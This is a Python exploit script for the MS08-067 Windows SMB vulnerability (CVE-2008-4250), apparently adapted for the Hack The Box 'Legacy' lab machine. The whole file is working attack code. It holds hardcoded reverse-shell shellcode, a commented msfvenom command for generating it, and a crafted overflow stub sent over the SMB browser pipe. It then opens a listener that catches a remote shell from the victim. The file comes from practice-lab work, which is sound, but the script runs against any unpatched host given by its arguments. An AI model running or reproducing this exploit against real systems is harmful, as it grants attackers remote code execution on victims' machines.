# -*- coding: utf-8 -*-

# MS08-067 modified for Legacy HTB
# CVE: 2008-4250
# Exploit author: HD Moore "hdm", Brett Moore
# https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

import argparse
import os.path
import subprocess
import sys

from impacket import smb
from impacket import uuid
from impacket.dcerpc.v5 import transport
from os import path
from pwn import *


def main():
    
    # args
    argparser = argparse.ArgumentParser(description='MS08-067 modified for Legacy HTB', 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
    
    main_arg.add_argument('--rhost', type=str,
                            help='Victim host', 
                            required=True)
    
    main_arg.add_argument('--rport', type=int,
                            help='Victim port (default: 445)', 
                            default=445)
    
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', 
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
    
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
    
    # cons
    rhost = args.rhost
    rport = args.rport
    lhost = args.lhost
    lport = args.lport
    
    def reverse_shell():
        
        print(" [*] Spawning the reverse shell...")
        l = listen(lport)
        l.sendline("""whoami""")
        l.interactive()
    
    def generate_shellcode():
        global shellcode
    
        if not path.exists("/usr/bin/msfvenom"):
            print(" [*] Please, install msfvenom with metasploit-framework package!")
            sys.exit(1)
        
        print(" [*] Generating the shellcode using msfvenom...")
        
        # TODO
        #output = subprocess.getoutput("msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f c -a x86 --platform windows".format(lhost, lport))
        
        #shellcode = output.split("unsigned char buf[] =")[1].replace('\n', '').replace('"', '').replace(' ', '').replace(';', '')
        #print(shellcode)
        #sys.exit(1)
        
        shellcode = "\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x9c\xac\x8e\xbb\x83\xee\xfc\xe2\xf4\x60\x44\x0c\xbb\x9c\xac\xee\x32\x79\x9d\x4e\xdf\x17\xfc\xbe\x30\xce\xa0\x05\xe9\x88\x27\xfc\x93\x93\x1b\xc4\x9d\xad\x53\x22\x87\xfd\xd0\x8c\x97\xbc\x6d\x41\xb6\x9d\x6b\x6c\x49\xce\xfb\x05\xe9\x8c\x27\xc4\x87\x17\xe0\x9f\xc3\x7f\xe4\x8f\x6a\xcd\x27\xd7\x9b\x9d\x7f\x05\xf2\x84\x4f\xb4\xf2\x17\x98\x05\xba\x4a\x9d\x71\x17\x5d\x63\x83\xba\x5b\x94\x6e\xce\x6a\xaf\xf3\x43\xa7\xd1\xaa\xce\x78\xf4\x05\xe3\xb8\xad\x5d\xdd\x17\xa0\xc5\x30\xc4\xb0\x8f\x68\x17\xa8\x05\xba\x4c\x25\xca\x9f\xb8\xf7\xd5\xda\xc5\xf6\xdf\x44\x7c\xf3\xd1\xe1\x17\xbe\x65\x36\xc1\xc4\xbd\x89\x9c\xac\xe6\xcc\xef\x9e\xd1\xef\xf4\xe0\xf9\x9d\x9b\x53\x5b\x03\x0c\xad\x8e\xbb\xb5\x68\xda\xeb\xf4\x85\x0e\xd0\x9c\x53\x5b\xeb\xcc\xfc\xde\xfb\xcc\xec\xde\xd3\x76\xa3\x51\x5b\x63\x79\x19\xd1\x99\xc4\x84\xb1\x92\xbd\xe6\xb9\x9c\xbd\xd0\x32\x7a\xc6\x9e\xed\xcb\xc4\x17\x1e\xe8\xcd\x71\x6e\x19\x6c\xfa\xb7\x63\xe2\x86\xce\x70\xc4\x7e\x0e\x3e\xfa\x71\x6e\xf4\xcf\xe3\xdf\x9c\x25\x6d\xec\xcb\xfb\xbf\x4d\xf6\xbe\xd7\xed\x7e\x51\xe8\x7c\xd8\x88\xb2\xba\x9d\x21\xca\x9f\x8c\x6a\x8e\xff\xc8\xfc\xd8\xed\xca\xea\xd8\xf5\xca\xfa\xdd\xed\xf4\xd5\x42\x84\x1a\x53\x5b\x32\x7c\xe2\xd8\xfd\x63\x9c\xe6\xb3\x1b\xb1\xee\x44\x49\x17\x6e\xa6\xb6\xa6\xe6\x1d\x09\x11\x13\x44\x49\x90\x88\xc7\x96\x2c\x75\x5b\xe9\xa9\x35\xfc\x8f\xde\xe1\xd1\x9c\xff\x71\x6e"
        print(" [*] Shellcode generated with success, size: {}".format(len(shellcode)))
    
    def connect_smb():
        global dce
        
        try:
            smb_trans_conn = transport.DCERPCTransportFactory('ncacn_np:{}[\\pipe\\browser]'.format(rhost))
            smb_trans_conn.connect()
            dce = smb_trans_conn.DCERPC_class(smb_trans_conn)
            dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
            
        except Exception as e:
            print(e)
            print(" [*] Failed to connect to SMB!")
            sys.exit(1)
        else:
            print(' [*] Connected to ncacn_np:{}[\\pipe\\browser]'.format(rhost))
    
    def exploit_crafting():
        global shellcode, stub
        
        print(" [*] Crafting the exploit...")
        
        try:
            num_nops = 410 - len(shellcode)
            newshellcode = "\x90" * num_nops
            newshellcode += shellcode
            shellcode = newshellcode
            jumper = "\x08\x04\x02\x00\xc2\x17\x89\x6f" + "A" * 4 + "\x07\xf8\x88\x6f" + "A" * 42 + "\x90" * 8 + "\xeb\x62" + "A" * 10
            path = "\x5c\x00" + "ABCDEFGHIJ" * 10 + shellcode + "\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + \
                "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + jumper + "\x00" * 2
            server = "\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
            prefix = "\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00" 
            max_count = "\x36\x01\x00\x00"
            offset = "\x00\x00\x00\x00"
            actual_count = "\x36\x01\x00\x00"
            stub = server + max_count + offset + actual_count + path + "\xE8\x03\x00\x00" + prefix + "\x01\x10\x00\x00\x00\x00\x00\x00"

        except Exception as e:
            print(e)
            print(" [*] Failed to craft the exploit!")
            sys.exit(1)
        else:
            print(" [*] Exploit crafted with success!")
            
    def exploit():
        
        print(" [*] Exploiting...")
        
        try:
            dce.call(0x1f, stub)
        except Exception as e:
            print(e)
            print(" [*] Failed to exploit the SMB!")
            sys.exit(1)
        else:
            print(" [*] SMB exploited with success!")
            reverse_shell()
    
    # main 
    print(" [>] MS08-067 modified for Legacy HTB")
    print(" [*] Python script exploit author: nullarmor")
    
    generate_shellcode()
    connect_smb()
    exploit_crafting()
    exploit()
    
    
if __name__ == "__main__":
    main()
